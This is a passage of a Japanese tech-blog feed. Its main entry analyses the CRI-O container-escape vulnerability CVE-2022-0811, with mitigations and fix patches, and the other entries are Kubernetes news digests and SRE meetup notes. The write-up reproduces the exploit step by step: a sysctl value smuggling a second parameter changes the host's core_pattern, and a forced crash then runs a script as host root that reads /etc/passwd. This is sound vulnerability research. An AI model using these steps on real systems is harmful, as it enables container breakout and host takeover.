の技術について包括的に学ぶのは（個人的には）難しいので、このような脆弱性の調査から学ぶアプローチも良いのではと思います。本記事が皆さんの学習の糧になれば幸いです。参考リンクCVE-2022-0492https://unit42.paloaltonetworks.jp/cve-2022-0492-cgroups/https://sysdig.jp/blog/detecting-mitigating-cve-2021-0492-sysdig/https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2022/03/06/cve-2022-0492https://nvd.nist.gov/vuln/detail/CVE-2022-0492Linuxhttps://lwn.net/Articles/679786/https://www.nginx.com/blog/what-are-namespaces-cgroups-how-do-they-work/https://linuxhint.com/install-linux-kernel-ubuntu/https://man7.org/linux/man-pages/man7/cgroups.7.htmlhttps://blog.tiqwab.com/2021/11/13/docker-and-cgroups.htmlhttps://en.wikipedia.org/wiki/Seccomphttps://en.wikipedia.org/wiki/Security-Enhanced_Linuxhttps://manpages.ubuntu.com/manpages/xenial/man5/apparmor.d.5.htmlコンテナセキュリティhttps://container-security.dev/security/breakout-to-host.htmlhttps://speakerdeck.com/mochizuki875/container-dev-securityhttps://speakerdeck.com/mochizuki875/container-seccomp","link":"https://kyohmizu.hatenablog.com/entry/2022/04/06/233150","isoDate":"2022-04-06T14:31:50.000Z","dateMiliSeconds":1649255510000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"[2022/04/01] 今週のKubernetes + Cloud Native + その他ニュース","contentSnippet":"普段は#kubenewsの2022年04月01日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/qNk58ApYjdg 告知とかニュースっぽいもの Kubernetes Meetup Tokyoで登壇しましたhttps:/...","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220401","isoDate":"2022-04-01T12:45:40.000Z","dateMiliSeconds":1648817140000,"authorName":"bells17","authorId":"bells17"},{"title":"CVE-2022-0811 調査まとめ","contentSnippet":"CRI-O の脆弱性 (CVE-2022-0811) について調べた内容をまとめました。脆弱性の詳細と、関連する CRI-O の実装や Linux の機能を紹介します。CVE-2022-0811 概要CRI-O についてCRI-O 概要pinns による pod へのカーネルパラメータ設定Coredumpエクスプロイト要点検証回避策修正パッチcommit1commit2containerd の場合さいごに参考リンクCVE-2022-0811 概要CVE-2022-0811 は CRI-O の任意コード実行・コンテナブレイクアウトの脆弱性で、報告した CrowdStrike 社は「cr8escape」と呼んでいます。CRI-O の v1.19 以降に影響があり、すでに修正バージョンがリリースされています。 (詳細は Security Advisory を参照)カーネルパラメータ設定の検証不備により、/proc/sys/kernel/core_pattern への書き込みが可能となっていました。これによりプロセスを異常終了させることでホストの root 権限で任意の操作を行えます。CRI-O についてCRI-O 概要https://github.com/cri-o/cri-oCRI-O は Kubernetes に最適化された軽量な高レベルコンテナランタイムです。CLI ツールは crictl (https://github.com/kubernetes-sigs/cri-tools) を使用します。# cat container-config.json {  \\"metadata\\": {      \\"name\\": \\"ubuntu\\"  },  \\"image\\":{      \\"image\\": \\"ubuntu\\"  },  \\"command\\": [      \\"sleep\\",      \\"3600\\"  ],  \\"log_path\\":\\"ubuntu.0.log\\",  \\"linux\\": {  }}# cat pod-config.json {    \\"metadata\\": {        \\"name\\": \\"ubuntu-sandbox\\",        \\"namespace\\": \\"default\\",        \\"attempt\\": 1,        \\"uid\\": \\"hdishd83fjaiarawuwk28bcsb\\"    },    \\"log_directory\\": \\"/tmp\\",    \\"linux\\": {    }}# crictl runp pod-config.json   ← pod の起動b69761649f8f655416d5cba64260298a5e462a6cb108ec54d3ae89c578510edc# crictl create b69761649f8f655416d5cba64260298a5e462a6cb108ec54d3ae89c578510edc container-config.json pod-config.json   ← コンテナ作成2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7# crictl start 2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7   ← コンテナ起動2ce8010c047dfdf9f16aa127b701fbeda32a1e46c4efcd383f9a20484e07aef7# crictl podsPOD ID              CREATED             STATE               NAME                NAMESPACE           ATTEMPT             RUNTIMEb69761649f8f6       42 seconds ago      Ready               ubuntu-sandbox      default             1                   (default)# crictl psCONTAINER           IMAGE               CREATED             STATE               NAME                ATTEMPT             POD ID2ce8010c047df       ubuntu              19 seconds ago      Running             ubuntu              0                   b69761649f8f6pinns による pod へのカーネルパラメータ設定CRI-O は pinns utility を使用することで、pod 起動時にカーネルパラメータ (sysctls) を設定できます。first commit)設定には -s オプションを使用し、key=value の形式で複数のカーネルパラメータを連結して渡すことができます。pinns -s kernel_parameter1=value1+kernel_parameter2=value2設定可能な sysctls は以下の実装で制限されています。https://github.com/cri-o/cri-o/blob/main/pkg/config/sysctl.govar prefixNamespaces = map[string]Namespace{  \\"kernel.shm\\": IpcNamespace,  \\"kernel.msg\\": IpcNamespace,  \\"fs.mqueue.\\": IpcNamespace,  \\"net.\\":       NetNamespace,}// Validate checks that a sysctl is whitelisted because it is known to be// namespaced by the Linux kernel. The parameters hostNet and hostIPC are used// to forbid sysctls for pod sharing the respective namespaces with the host.// This check is only used on sysctls defined by the user in the crio.conf// file.func (s *Sysctl) Validate(hostNet, hostIPC bool) error {  nsErrorFmt := \\"%q not allowed with host %s enabled\\"  if ns, found := namespaces[s.Key()]; found {    if ns == IpcNamespace && hostIPC {      return errors.Errorf(nsErrorFmt, s.Key(), ns)    }    return nil  }  for p, ns := range prefixNamespaces {    if strings.HasPrefix(s.Key(), p) {      if ns == IpcNamespace && hostIPC {        return errors.Errorf(nsErrorFmt, s.Key(), ns)      }      if ns == NetNamespace && hostNet {        return errors.Errorf(nsErrorFmt, s.Key(), ns)      }      return nil    }  }  return errors.Errorf(\\"%s not whitelisted\\", s.Key())}sysctls の適用は pinns 内に実装されており、-s オプションの設定値をもとに /proc/sys/ 以下のファイルに書き込みを行なっています。https://github.com/cri-o/cri-o/blob/main/pinns/src/sysctl.cstatic int write_sysctl_to_file (char * sysctl_key, char* sysctl_value){  if (!sysctl_key || !sysctl_value)  {    pwarn (\\"sysctl key or value not initialized\\");    return -1;  }  // replace periods with / to create the sysctl path  for (char* it = sysctl_key; *it; it++)    if (*it == \'.\')      *it = \'/\';  _cleanup_close_ int dirfd = open (\\"/proc/sys\\", O_DIRECTORY | O_PATH | O_CLOEXEC);  if (UNLIKELY (dirfd < 0))  {    pwarn (\\"failed to open /proc/sys\\");    return -1;  }  _cleanup_close_ int fd = openat (dirfd, sysctl_key, O_WRONLY);  if (UNLIKELY (fd < 0))  {    pwarnf (\\"failed to open /proc/sys/%s\\", sysctl_key);    return -1;  }  int ret = TEMP_FAILURE_RETRY (write (fd, sysctl_value, strlen (sysctl_value)));  if (UNLIKELY (ret < 0))  {    pwarnf (\\"failed to write to /proc/sys/%s\\", sysctl_key);    return -1;  }  return 0;}Coredumpプロセスが異常終了した時に、プロセスメモリの dump を core ファイルとして出力します。Coredump の設定は /proc/sys/kernel/core_pattern に書かれており、ファイルの直接編集や sysctl コマンドで設定を変更できます。# sysctl -w kernel.core_pattern=\\"%e-%s.core\\"kernel.core_pattern には dump の出力先パスを指定しますが、最初文字がパイプ | の場合は指定パスのプログラムを実行します (この場合 dump は標準入力として渡される)。/proc/sys/kernel/core_pattern のデフォルト値として、ubuntu (20.04) では apport というバグレポートツールが指定されています。$ cat /proc/sys/kernel/core_pattern|/usr/share/apport/apport %p %s %c %d %P %Eまた Coredump のファイルサイズ上限は ulimit で設定します。脆弱性は Soft Limit が0でも刺さりそうです。# cat /proc/self/limits Limit                     Soft Limit           Hard Limit           Units     Max cpu time              unlimited            unlimited            seconds   Max file size             unlimited            unlimited            bytes     Max data size             unlimited            unlimited            bytes     Max stack size            8388608              unlimited            bytes     Max core file size        0                    unlimited            bytes     Max resident set          unlimited            unlimited            bytes     Max processes             3819                 3819                 processes Max open files            1024                 1048576              files     Max locked memory         67108864             67108864             bytes     Max address space         unlimited            unlimited            bytes     Max file locks            unlimited            unlimited            locks     Max pending signals       3819                 3819                 signals   Max msgqueue size         819200               819200               bytes     Max nice priority         0                    0                    Max realtime priority     0                    0                    Max realtime timeout      unlimited            unlimited            usエクスプロイト要点kernel.core_pattern は Namespaced ではないため、ホストとコンテナで同じファイルを参照するコンテナ内からは変更不可pod 起動時に sysctl に kernel.core_pattern を設定できれば、ホストの値も変更できるCIO-O 内で sysctl のキーを検証しているが、value に + を含む文字列を渡すことでバイパス可能 (以下コードを参照)設定後にプロセスを異常終了させることで、ホストの root 権限で任意コード実行問題となったコードfunc getSysctlForPinns(sysctls map[string]string) string {  // this assumes there\'s no sysctl with a `+` in it  const pinnsSysctlDelim = \\"+\\"  g := new(bytes.Buffer)  for key, value := range sysctls {    fmt.Fprintf(g, \\"\'%s=%s\'%s\\", key, value, pinnsSysctlDelim)  // ← \\"\'key1=value1\'+\'key2=value2\'\\" の形で文字列連結する  }  return strings.TrimSuffix(g.String(), pinnsSysctlDelim)}検証脆弱なバージョンの CRI-O で CVE-2022-0811 を検証します。Kubernetes は使用せず、crictl での検証を行いました。# crio --versioncrio version 1.23.1Version:          1.23.1GitCommit:        af642cdafed31e4be5dd82e996bb084050c8bb89GitTreeState:     dirtyBuildDate:        1980-01-01T00:00:00ZGoVersion:        go1.17.4Compiler:         gcPlatform:         linux/amd64Linkmode:         staticBuildTags:        apparmor, exclude_graphdriver_devicemapper, seccomp, selinuxSeccompEnabled:   trueAppArmorEnabled:  true最初にホストに実行させたいプログラムを配置するコンテナを作成します。json、pod-config.json は前述のファイルと同じものです。# crictl runp pod-config.json d33614f0b22d3d81bb680ee76eb1882a1b6287bb99515d6505d75e315b01297a# crictl create d33614f0b22d3d81bb680ee76eb1882a1b6287bb99515d6505d75e315b01297a container-config.json pod-config.json 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123# crictl start 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac61239029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123起動したコンテナにアタッチし、コンテナの root パスにプログラムを配置します。/etc/passwd をコンテナ内の /output に出力するスクリプトを用意しました。# crictl exec -it 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123 bashroot@d33614f0b22d:/# mount | grep overlayoverlay on / type overlay (rw,relatime,lowerdir=/var/lib/containers/storage/overlay/l/73PSGHB33J2RBZXIUVK7SRC4UA,upperdir=/var/lib/containers/storageoverlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff,workdir=/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/work,metacopy=on,volatile)root@d33614f0b22d:/# echo \'#!/bin/sh\' > /cmdroot@d33614f0b22d:/# echo \'cat /etc/passwd > /var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/output\' >> cmdroot@d33614f0b22d:/# cat /cmd#!/bin/shcat /etc/passwd > /var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/outputroot@d33614f0b22d:/# chmod a+x /cmd続いて kernel.core_pattern を変更する pod を作成します。+ で連結した value を記載します。value に記載する kernel.core_pattern には、ホストから見たプログラムの絶対パスを指定しています。# をつけていますが、これは CRI-O の実装で付与されるシングルクォートを無効化する役割があります。# cat /proc/sys/kernel/core_pattern|/usr/share/apport/apport %p %s %c %d %P %E# cat pod-config2.json {    \\"metadata\\": {        \\"name\\": \\"ubuntu-sandbox2\\",        \\"namespace\\": \\"default\\",        \\"attempt\\": 1,        \\"uid\\": \\"edishd83djaidwnduwk28bcsd\\"    },    \\"log_directory\\": \\"/tmp\\",    \\"linux\\": {  \\"sysctls\\": {      \\"kernel.shm_rmid_forced\\": \\"1+kernel.core_pattern=|/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/cmd #\\"  }    }}# crictl runp pod-config2.json FATA[0001] run pod sandbox: rpc error: code = Unknown desc = container create failed: write to /proc/sys/kernel/shm_rmid_forced: Invalid argument pod 作成はエラーになりますが、kernel.core_pattern を見ると変更されていることがわかります。# cat /proc/sys/kernel/core_pattern |/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/cmd #\'最後に起動中のコンテナ内でプロセスを異常終了させることで、 Coredump の機能を呼び出しホストの root 権限でプログラムを実行させることができます。root@d33614f0b22d:/# tail -f /dev/null &[1] 17root@d33614f0b22d:/# ps    PID TTY          TIME CMD      4 pts/0    00:00:00 bash     17 pts/0    00:00:00 tail     18 pts/0    00:00:00 psroot@d33614f0b22d:/# kill -SIGSEGV 17root@d33614f0b22d:/# ls /bin  boot  cmd  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  output  proc  root  run  sbin  srv  sys  tmp  usr  var[1]+  Segmentation fault      (core dumped) tail -f /dev/nullroot@d33614f0b22d:/# cat /output root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin...回避策CrowdStrike 社のブログ を参考にしています。CRI-O のアップデート (非推奨だが v1.18 以下へのダウングレードも可)OPA 等のポリシーを設定するPSP で sysctls を全てブロックするpinns の -s を除去するラッパーを用意し、crio.conf の pinns_path に設定する修正パッチcommit1https://github.com/cri-o/cri-o/commit/05c443b06356c2dbf9d30060f362279c6b8ac1a1pinns の -s オプションを生成する箇所で、+ に対してバリデーションを追加しています。  func (mgr *NamespaceManager) NewPodNamespaces(cfg *PodNamespacesConfig) ([]Namespace, error) {    ...      if len(cfg.Sysctls) != 0 {-     pinnsArgs = append(pinnsArgs, \\"-s\\", getSysctlForPinns(cfg.Sysctls))+     pinnsSysctls, err := getSysctlForPinns(cfg.Sysctls)+     if err != nil {+       return nil, errors.Wrapf(err, \\"invalid sysctl\\")+     }+     pinnsArgs = append(pinnsArgs, \\"-s\\", pinnsSysctls)    }      ...  }- func getSysctlForPinns(sysctls map[string]string) string {-   // this assumes there\'s no sysctl with a `+` in it+ func getSysctlForPinns(sysctls map[string]string) (string, error) {+   // This assumes there\'s no valid sysctl value with a `+` in it+   // and as such errors if one is found.    const pinnsSysctlDelim = \\"+\\"    g := new(bytes.Buffer)    for key, value := range sysctls {+     if strings.Contains(key, pinnsSysctlDelim) || strings.Contains(value, pinnsSysctlDelim) {+       return \\"\\", errors.Errorf(\\"\'%s=%s\' is invalid: %s found yet should not be present\\", key, value, pinnsSysctlDelim)+     }      fmt.Fprintf(g, \\"\'%s=%s\'%s\\", key, value, pinnsSysctlDelim)    }-   return strings.TrimSuffix(g.String(), pinnsSysctlDelim)+   return strings.TrimSuffix(g.String(), pinnsSysctlDelim), nil  }commit2https://github.com/cri-o/cri-o/commit/1af1f8af2c7e23525102dffbf0899b69e34ed3d2文字列の連結をやめ、-s をパラメータ毎に設定する修正がされています。  func (mgr *NamespaceManager) NewPodNamespaces(cfg *PodNamespacesConfig) ([]Namespace, error) {    ...  -   if len(cfg.Sysctls) != 0 {-     pinnsSysctls, err := getSysctlForPinns(cfg.Sysctls)-     if err != nil {-       return nil, errors.Wrapf(err, \\"invalid sysctl\\")-     }-     pinnsArgs = append(pinnsArgs, \\"-s\\", pinnsSysctls)+   for key, value := range cfg.Sysctls {+     pinnsArgs = append(pinnsArgs, \\"-s\\", fmt.Sprintf(\\"%s=%s\\", key, value))    }      ...  }containerd の場合他のコンテナランタイムがどうなっているか気になったので、containerd の実装を調べてみました。https://github.com/opencontainers/runc/blob/main/libcontainer/configs/validate/validator.go// sysctl validates that the specified sysctl keys are valid or not.// /proc/sys isn\'t completely namespaced and depending on which namespaces// are specified, a subset of sysctls are permitted.func (v *ConfigValidator) sysctl(config *configs.Config) error {    validSysctlMap := map[string]bool{        \\"kernel.msgmax\\":          true,        \\"kernel.msgmnb\\":          true,        \\"kernel.msgmni\\":          true,        \\"kernel.sem\\":             true,        \\"kernel.shmall\\":          true,        \\"kernel.shmmax\\":          true,        \\"kernel.shmmni\\":          true,        \\"kernel.shm_rmid_forced\\": true,    }    for s := range config.Sysctl {        if validSysctlMap[s] || strings.HasPrefix(s, \\"fs.mqueue.\\") {            if config.Namespaces.Contains(configs.NEWIPC) {                continue            } else {                return fmt.Errorf(\\"sysctl %q is not allowed in the hosts ipc namespace\\", s)            }        }        if strings.HasPrefix(s, \\"net.\\") {            if config.Namespaces.Contains(configs.NEWNET) {                continue            } else {                return fmt.Errorf(\\"sysctl %q is not allowed in the hosts network namespace\\", s)            }        }        return fmt.Errorf(\\"sysctl %q is not in a separate kernel namespace\\", s)    }    return nil}CRI-O は pinns により独自の sysctls 設定を実装していますが、pod 作成時に設定する都合上、 OCI の機能を使わない方法を選んだのかもしれません (根拠はないです)。さいごに初めて CRI-O を触りましたが、Docker や containerd とはかなり仕組みが異なることがわかりました。脆弱性の調査を通して CRI-O の実装や Linux の機能に触れることができ、良い機会を得られたと思います。内容に誤りが含まれる可能性がありますので、何かお気づきの方はご指摘等よろしくお願いします。参考リンクhttps://nvd.nist.gov/vuln/detail/CVE-2022-0811https://blog.aquasec.com/cve-2022-0811-cri-o-vulnerabilityhttps://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/https://github.com/cri-o/cri-o/security/advisories/GHSA-6x2m-w449-qwx7https://pwning.systems/posts/escaping-containers-for-fun/https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mountshttps://valinux.hatenablog.com/entry/20210721https://qiita.com/rarul/items/d33b664c8414f065e65ehttps://man7.org/linux/man-pages/man5/core.5.htmlhttps://lwn.net/Articles/280959/https://wiki.ubuntu.com/Apport","link":"https://kyohmizu.hatenablog.com/entry/2022/03/28/182243","isoDate":"2022-03-28T09:22:43.000Z","dateMiliSeconds":1648459363000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"nnn(Terminal file manager)を使ってみる","contentSnippet":"nnnとはhttps://github.com/jarun/nnnターミナル上で動作するファイルマネージャー 良い点軽量で高速な動作を保つために機能をプラグインとして外出しして拡張できる設計になってますプラグインはシェルスクリプトなどで簡単に記述できますキーバインドはviライクですtmuxを利用してる状態の画像表示も問題ないですターミナルはkittyを利用しています インストールUbuntu$ sudo apt install nnnArch Linux$ sudo pacman -S nnnMacOS$ bre...","link":"https://zenn.dev/tayusa/articles/1f87e798ccbed0","isoDate":"2022-03-27T13:27:45.000Z","dateMiliSeconds":1648387665000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"[2022/03/25] 今週のKubernetes + Cloud Native + その他ニュース","contentSnippet":"普段は#kubenewsの2022年03月25日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/NewvQB5q-QU 告知とかニュースっぽいもの Cloud Native Database Meetup #4https:...","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220325","isoDate":"2022-03-25T12:55:35.000Z","dateMiliSeconds":1648212935000,"authorName":"bells17","authorId":"bells17"},{"title":"golangで作るTCPIPプロトコル","contentSnippet":"はじめにとりあえずIT業界に入ったら読んでおけという名著はいろいろありますが、その中の1冊がマスタリングTCP/IP入門編でしょう。僕も買ってはいたものの読むのを途中で挫折していたので、今回しっかり読んでTCP/IPを再勉強してみたいと思います。マスタリングTCP/IPを読みながらその他わからんことはググりつつ、golangでTCPIPプロトコルそのものを自作してみます。方針は以下のようにします。ethernetから作るデータのやり取りにnetパッケージは一切使わない(訂正、PCのIPやMacアドレスを取るのにだけ使用しますた)データのやり取りに使うのはsyscal...","link":"https://zenn.dev/satoken/articles/golang-tcpip","isoDate":"2022-03-21T16:39:19.000Z","dateMiliSeconds":1647880759000,"authorName":"satoken","authorId":"satoken"},{"title":"[2022/03/18] 今週のKubernetes + Cloud Native + その他ニュース","contentSnippet":"普段は#kubenewsの2022年03月18日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/y7DMp3aqCFM 告知とかニュースっぽいもの 3-shake SRE Tech Talk #3https://youtu...","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220318","isoDate":"2022-03-18T12:50:45.000Z","dateMiliSeconds":1647607845000,"authorName":"bells17","authorId":"bells17"},{"title":"あるいはサイドカーでいっぱいの海","contentSnippet":"3-shake SRE Tech Talk #3 https://3-shake.connpass.com/event/241284/ #SRETT","link":"https://speakerdeck.com/nwiizo/aruihasaidokadeitupaifalsehai","isoDate":"2022-03-18T04:00:00.000Z","dateMiliSeconds":1647576000000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"NFTを開発するためのブロックチェーン・スマートコントラクト技術","contentSnippet":"https://cryptocurrency.connpass.com/event/240069/\\rNFT(Non Fungible Token:非代替性トークン)が社会で大きな注目を集めています。\\rEthereum(イーサリアム)ブロックチェーンの概要から始まり、スマートコントラクトについて触れ、NFTを開発するための技術についてお伝えしました。","link":"https://speakerdeck.com/shukob/nftwokai-fa-surutamefalseburotukutiensumatokontorakutoji-shu","isoDate":"2022-03-12T05:00:00.000Z","dateMiliSeconds":1647061200000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Observability Conference 2022 に登壇しました","contentSnippet":"「Dapr の概念と実装から学ぶ Observability への招待」 というタイトルで登壇します。https://event.cloudnativedays.jp/o11y2022/talks/1382:embed:cite セッション概要Dapr は CloudNative な技術を背景に持つ分散アプリケーションランタイムです。本セッションでは Dapr の Observability に関する各種機能と、その実装について解説していきます。さらにスリーシェイクの Dapr と Observability への取り組みに関してもご紹介します。Dapr の機能でカバーできる点...","link":"https://zenn.dev/nwiizo/articles/d837b78914de23","isoDate":"2022-03-11T04:02:18.000Z","dateMiliSeconds":1646971338000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"[2022/03/04] 今週のKubernetes + Cloud Native + その他ニュース","contentSnippet":"普段は#kubenewsの2022年03月04日の回で話す、@bells17が今週気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。あと記事はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://youtu.be/3s0T6k24I_o 告知とかニュースっぽいもの Twitterコミュニティ機能についてhttps://twitter.co...","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220304","isoDate":"2022-03-04T12:34:50.000Z","dateMiliSeconds":1646397290000,"authorName":"bells17","authorId":"bells17"},{"title":"Dapr の概念と実装から学ぶObservability への招待","contentSnippet":"Observability Conference 2022 2022/03/11(Fri)\\rDapr の概念と実装から学ぶObservability への招待\\rhttps://event.cloudnativedays.jp/o11y2022/talks/1353","link":"https://speakerdeck.com/nwiizo/dapr-falsegai-nian-toshi-zhuang-karaxue-bu-observability-hefalsezhao-dai","isoDate":"2022-02-28T05:00:00.000Z","dateMiliSeconds":1646024400000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"JAWS-UG SRE支部 #2 突撃！となりのSRE","contentSnippet":"jawsug-sre.connpass.com聞いてきましたのでメモと感想を残しておきます。LTマネーフォーワードのマイクロサービス基盤のこれまでとこれから by マネーフォワード @grezarjpマネーフォワードのマイクロサービス基盤の移り変わりの紹介。中央集権構造 => 権限移譲フェーズ => これから中央集権構造サービスごとに開発チームが存在、サービスにまたがってインフラチームが存在開発チームはインフラを気にしなくてもすんだ。メンバーが少ないうちはなんとかなった組織の規模に対してインフラチームがスケールしなくなった責務の分解点を再定義 DevOpsへ権限移譲フェーズ開発チームに権限を渡していくAWSとKubernatesを使用ランタイム、ミドルウェアも開発チームが管理サービスごとにNamespaceを切る、Namespace内で開発チームは権限を持つマイクロサービスごとにAWSアカウント管理して、リソースを管理するこれから権限は渡したが、運用まではむつかしい開発の運用を負荷を下げるためにTerraformのモジュール化、設定のバリデーションの整備AWSアカウントの統制、コスト可視化を進めたいアプリケーションランタイムのSnadbox化特殊要件なアプリケーションで使えるように開発チームにここまでインフラの権限を渡せて、運用できるのはすごいなと思った。QAQ: 開発チームの権限移譲の苦労、運用面、技術面A: マルチアカウントをつかって 技術上の考慮点があった人と人とのかかわりに関しては銀の弾丸はないので、地道な作業が必要ドキュメントとかで監視項目を揃えてあげるのに力を入れたQ: 開発とインフラでスキルセットの違いはあった?A:インフラはアプリをあんまり見てこなかったのでそのへんのギャップはあったQ: EKSのテナント分割の単位A: 権限分類と障害の影響範囲の最小化はシングルテナントが有利とは言われるが運用負荷を下げるためにマルチテナントを選んだSREグループのマネージャーという立場になって真っ先にやったこと by ミクシィ@isaoshimizu内容に関しては、スライドに詳しく書いてあるので参照。SREのミッション・バリューいいなあと思った。うちのチームでもちゃんと考えたい。SRE Lounge #13 LTでも今回と近いことを書いてるので参照してほしいとのこと↓組織にSREの文化を作り上げていくEnabling SRE | Money Forward Engineers\' BlogQAQ: SRE主導でやるべきではなかったことA: SREは万能な人がおおくでできてしまう開発側のリソースが足りなくて急がないといけないことをSREがやってしまう本来はそうじゃないよねって話自分としては、SREでも開発分野でも巻き取れることはやってしまってもいいと思うんですよね。線を引きすぎるとセクショナリズムになってあまり良くない気がしてる。組織のあり方はそれぞれで、コンテキスト分かってないので、言い切ることはできないですが。Containerサービス と Toil と by スリーシェイク \xa0@tt0603ECSとEKSについてToilと紐付けての話題。Toilの削減ステップ特定計測削減ただこのプロセスはつらい。SREとしては長期的なエンジニアリング に時間を使いたい。本質的なことをすることが目的。Toilを削減することが目的ではない。技術選定として、まずマネージドで考える。チームとして何を大事にしているかを考える。自分たちの”サイズ”で技術選定をして価値あるエンジニアリングをする。個人的にはEKSとECSのまとめがわかりやすくてよかった。QAQ: セルフホステッドを選択する場合は?A: 監視するとき Prometheus使うときとかつらいのでFargateは起動が遅い スケールが遅い技術選定において、自分たちの「サイズ」っていう要素が存在するというのは暗黙的なものになりがちなので、ちゃんと具体的に捉えておくの大事な気がした。 #jawsug_sre— Tomoya Kitaura (@kitta0108) 2022年2月25日  先程はパッと答えられませんでしたが、弊社の場合はMicroServiceを運用する際にはIstioを利用するケースが非常に多く、現状では対応していないため、EKSの場合はSelf Hostedを利用するケースが多いですー#jawsug_sre— TakuyaTezuka@3-shake (@tt0603) 2022年2月25日  パネルディスカッションMFのSREの組織のやり方で工夫してるところもともと中央集権的だった、開発に権限移譲していった権限を渡していっていながらそれ以上にプロダクトが開発が増えてしまったので負荷が増えてしまったenabling SREを広げる役割もつくるSREというポジションじゃなくてもSRE的な動きができるように組織にSREの文化を作り上げていくEnabling SRE | Money Forward Engineers\' Blog技術支援からSREの組織変数がいくつか システムの規模 性質 組織規模、レベル感などpure sreではじめて権限移譲していく自分たちのサイズに合わせて組織を作っていく開発とSREのベストの距離感タイミングによって違う固定されたものじゃない構成をいかにシンプルにできるかが大事SREが開発に使いやすいサービスを提供するSREのAPIを提供するので好きに使って的な横断組織SREと開発チーム内SREというパターンもあるお互いのコミュニケーションは大事採用する際に求めるスキルセットやレベル感なんでもかんでも能力を持ってる人はいない。特定の領域に得意を持ってるといい、最低限のレベル感はほしいコミュニケーション 大事 ソフトスキルの担保が大事会社のバリューにあってるかSREワークブックの最後の方求められるスキル書いてあるすべてのインフラコードはIaCに寄せたい、チームにはソフトウェアスキル、インフラスキルそれぞれ持つメンバーがほしい変更時のトラブルシューティングはできるべきコードレビューできるスキルを持っていてほしいコーディングあるていどできる人組織による開発をSREに興味をもってもらうはどうしたらいいのだろうかSLOを決めて共通言語で話す留学すると面白いかもお互いがどういう観点で仕事してるかがわかってよいどこまで開発に移譲するかエラーバジェット、SLO、SLIは必要SREが設定するSLOより開発者が設定するSLOの方がいい開発者にとってうまいところを教えるアプローチ開発者にとってもバグが出ないことによって、気持ちよく開発できるよ!開発者の観点じゃなくてビジネス観点でSLO設定するんじゃないのかなって思う。。。?あと、留学いいなあと思った。開発チームに留学したい。SREチームが存在しない。どんなフェーズになったらSREチームを作ったほうがいいというしきい値あります?開発者が開発以外に手を取られて開発スピードが落ちてるのが目に見えたら兼務の限界値がある。得意なことにバリューを出せるようにしたい開発しながらAWSの新機能をキャッチアップするのはたいへんdevとopsのバランスが崩れているとき SREのプラクティスをいれるといいのかもエラーバジェットが判断軸になるかもどれくらいのチームが困ってるかが判断軸になるToil撲滅の意味で費用対効果高かったLambdaランキング今Lambdaを殆ど使ってないchatbotが出たのでLambdaの役割を終えたEKS上にアプリケーションを作ってしまうことが多い必要悪としてのLambda 